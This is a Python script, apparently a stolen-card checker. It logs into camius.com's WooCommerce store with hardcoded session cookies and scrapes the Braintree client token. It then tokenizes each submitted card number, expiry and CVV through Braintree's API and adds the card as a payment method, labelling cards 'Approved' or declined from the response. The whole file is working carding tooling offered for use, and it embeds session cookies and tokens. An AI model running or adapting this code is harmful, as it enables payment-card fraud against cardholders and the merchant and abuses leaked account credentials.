import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
  while True:
    lines = '''newhitler9%7C1723801323%7Cy8VZfj1MhOfmcNUZDtDN5b4GiTGw1bwVnnSs12Gsgwg%7C46634c50b778fd1e747276c0cb53e3d87c4e382dd6d6fe93a26b45b1b8aa5f83; wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1=1668%7Cother%7Cread%7Cbe33c792884f0f13004efa2860d947dc04deabecf35c145370ec3d383fcad6c4''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    cookies = {
        '__wpdm_client': 'c5941813aa8bc6f6c6ffcad4aec421e6',
        'soundestID': '20240802093902-unhk6E425fJTdsm8wVJxLTVA2IXP9x8MCt3VhJRgz25kW9VvL',
        'omnisendSessionID': '5Hevzq3d4N2OmG-20240802093902',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        '_ga': 'GA1.1.329772879.1722591544',
        '_clck': 'eyvrny%7C2%7Cfnz%7C0%7C1675',
        'omnisendContactID': '66aca97221abdd4645859ea2',
        'fp_logged_in_roles': 'customer',
        'wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1': '1668%7Cother%7Cread%7Cbe33c792884f0f13004efa2860d947dc04deabecf35c145370ec3d383fcad6c4',
        'tk_ai': 'VokojUmHl8ISszp65zguZyy7',
        'wordpress_test_cookie': 'WP%20Cookie%20check',
        '_gcl_au': '1.1.1457930894.1722591543.1938636640.1722591562.1722591721',
        'wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28': big,
        'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fpayment-methods%2F',
        '_ga_DQ29W22D22': 'GS1.1.1722591543.1.1.1722591758.6.0.0',
        'page-views': '6',
        'tk_qs': '',
        '_uetsid': '0dc9270050b311efa3daed313946d1b1',
        '_uetvid': '0dca1ab050b311efabf881a600cbb54a',
        '_clsk': 'kncivk%7C1722591761223%7C6%7C1%7Cz.clarity.ms%2Fcollect',
    }
    
    headers = {
        'authority': 'www.camius.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': '__wpdm_client=c5941813aa8bc6f6c6ffcad4aec421e6; soundestID=20240802093902-unhk6E425fJTdsm8wVJxLTVA2IXP9x8MCt3VhJRgz25kW9VvL; omnisendSessionID=5Hevzq3d4N2OmG-20240802093902; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _ga=GA1.1.329772879.1722591544; _clck=eyvrny%7C2%7Cfnz%7C0%7C1675; omnisendContactID=66aca97221abdd4645859ea2; fp_logged_in_roles=customer; wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1=1668%7Cother%7Cread%7Cbe33c792884f0f13004efa2860d947dc04deabecf35c145370ec3d383fcad6c4; tk_ai=VokojUmHl8ISszp65zguZyy7; wordpress_test_cookie=WP%20Cookie%20check; _gcl_au=1.1.1457930894.1722591543.1938636640.1722591562.1722591721; wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28=newhitler9%7C1723801323%7Cy8VZfj1MhOfmcNUZDtDN5b4GiTGw1bwVnnSs12Gsgwg%7C46634c50b778fd1e747276c0cb53e3d87c4e382dd6d6fe93a26b45b1b8aa5f83; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fpayment-methods%2F; _ga_DQ29W22D22=GS1.1.1722591543.1.1.1722591758.6.0.0; page-views=6; tk_qs=; _uetsid=0dc9270050b311efa3daed313946d1b1; _uetvid=0dca1ab050b311efabf881a600cbb54a; _clsk=kncivk%7C1722591761223%7C6%7C1%7Cz.clarity.ms%2Fcollect',
        'referer': 'https://www.camius.com/my-account/payment-methods/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.get('https://www.camius.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
    add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '5ec4b3f6-fc47-493f-ac56-d1979236c96b',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '78747',
                        'streetAddress': '8022 Thaxton Rd',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']

    cookies = {
        '__wpdm_client': 'c5941813aa8bc6f6c6ffcad4aec421e6',
        'soundestID': '20240802093902-unhk6E425fJTdsm8wVJxLTVA2IXP9x8MCt3VhJRgz25kW9VvL',
        'omnisendSessionID': '5Hevzq3d4N2OmG-20240802093902',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        '_ga': 'GA1.1.329772879.1722591544',
        '_clck': 'eyvrny%7C2%7Cfnz%7C0%7C1675',
        'fp_logged_in_roles': 'customer',
        'wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1': '1668%7Cother%7Cread%7Cbe33c792884f0f13004efa2860d947dc04deabecf35c145370ec3d383fcad6c4',
        'tk_ai': 'VokojUmHl8ISszp65zguZyy7',
        'wordpress_test_cookie': 'WP%20Cookie%20check',
        'wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28': big,
        'omnisendContactID': '66aca97221abdd4645859ea2',
        '_gcl_au': '1.1.1457930894.1722591543.1938636640.1722591562.1722592083',
        'page-views': '16',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F',
        '_uetsid': '0dc9270050b311efa3daed313946d1b1',
        '_uetvid': '0dca1ab050b311efabf881a600cbb54a',
        '_clsk': 'kncivk%7C1722592106568%7C16%7C1%7Cz.clarity.ms%2Fcollect',
        'tk_qs': '',
        '_ga_DQ29W22D22': 'GS1.1.1722591543.1.1.1722592160.5.0.0',
    }
    
    headers = {
        'authority': 'www.camius.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '__wpdm_client=c5941813aa8bc6f6c6ffcad4aec421e6; soundestID=20240802093902-unhk6E425fJTdsm8wVJxLTVA2IXP9x8MCt3VhJRgz25kW9VvL; omnisendSessionID=5Hevzq3d4N2OmG-20240802093902; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-02%2009%3A09%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _ga=GA1.1.329772879.1722591544; _clck=eyvrny%7C2%7Cfnz%7C0%7C1675; fp_logged_in_roles=customer; wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1=1668%7Cother%7Cread%7Cbe33c792884f0f13004efa2860d947dc04deabecf35c145370ec3d383fcad6c4; tk_ai=VokojUmHl8ISszp65zguZyy7; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28=newhitler9%7C1723801323%7Cy8VZfj1MhOfmcNUZDtDN5b4GiTGw1bwVnnSs12Gsgwg%7C46634c50b778fd1e747276c0cb53e3d87c4e382dd6d6fe93a26b45b1b8aa5f83; omnisendContactID=66aca97221abdd4645859ea2; _gcl_au=1.1.1457930894.1722591543.1938636640.1722591562.1722592083; page-views=16; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=0dc9270050b311efa3daed313946d1b1; _uetvid=0dca1ab050b311efabf881a600cbb54a; _clsk=kncivk%7C1722592106568%7C16%7C1%7Cz.clarity.ms%2Fcollect; tk_qs=; _ga_DQ29W22D22=GS1.1.1722591543.1.1.1722592160.5.0.0',
        'origin': 'https://www.camius.com',
        'referer': 'https://www.camius.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': tok,
        'braintree_cc_device_data': '{"device_session_id":"4c9d34140effd27a10a304dc5ed8420c","fraud_merchant_id":null,"correlation_id":"473ff3f2461667795b5598b6878e11ff"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/3j685wjt88rnyb4b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/3j685wjt88rnyb4b"},"merchantId":"3j685wjt88rnyb4b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI3MWRmYzE4NS1hZjg2LTQwNmUtOWI2ZS02OTgxNmQwOWE3NjEiLCJpYXQiOjE3MjI1OTIxMDAsImV4cCI6MTcyMjU5OTMwMCwiaXNzIjoiNjVhOTEzMDYwOGJjMDI3ZjBlNmRlNjllIiwiT3JnVW5pdElkIjoiNjVhNmVmMzEwOGJjMDI3ZjBlNmRlMmU5In0.btC1gsopFESEsEtkkfMbWPfVTLK6GFML0NylFa3_RdY"},"paypalEnabled":true,"paypal":{"displayName":"Camius","clientId":"AeMlQfFgOlM7YFsp1tSNXTT8tTnThQ25BwQKWWr-QR_8lHXYako3E9iXuAKbmv0Kb1uAxpET3d6kK3Zx","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"MaxcomInternational_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': add_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    response = requests.post('https://www.camius.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:
      result = "Wait for 20 Sec"
    else:
      result = "Declined"
      print('er#')
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Low Funds' in result:
     return 'Approved'
  else:
     return result
def sq(card):
  return 'Dev @zodmadara'
